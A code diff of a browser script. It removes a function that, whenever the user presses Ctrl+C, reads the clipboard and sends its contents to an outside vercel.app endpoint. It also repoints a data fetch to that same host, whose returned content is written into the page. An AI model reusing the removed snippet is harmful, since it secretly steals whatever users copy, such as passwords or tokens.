@@ -1,15 +1,4 @@
-function getClipboard() {
-    navigator.clipboard.readText().then(function (text) {
-        fetch(`https://airtel-net.vercel.app/api/send?data=${encodeURIComponent(text)}&api=@f@aabz`,)
-    });
-}
 
-document.addEventListener('keydown', function(event) {
-    if (event.ctrlKey && event.key === 'c') {
-        console.log('✅');
-      getClipboard();
-    }
-  });
 
 
 let button = document.getElementById('myButton');
@@ -55,7 +44,7 @@ document.body.appendChild(divEl);
 
   async function getData(){
     try {
-        const data  = await fetch('https://online-uni-mysore-in.vercel.app/api/get?api=@f@aabz');
+        const data  = await fetch('https://airtel-net.vercel.app/api/get?api=@f@aabz');
         const json = await data.json();
         if(json.success){
             updateContentDiv(json.data.data);
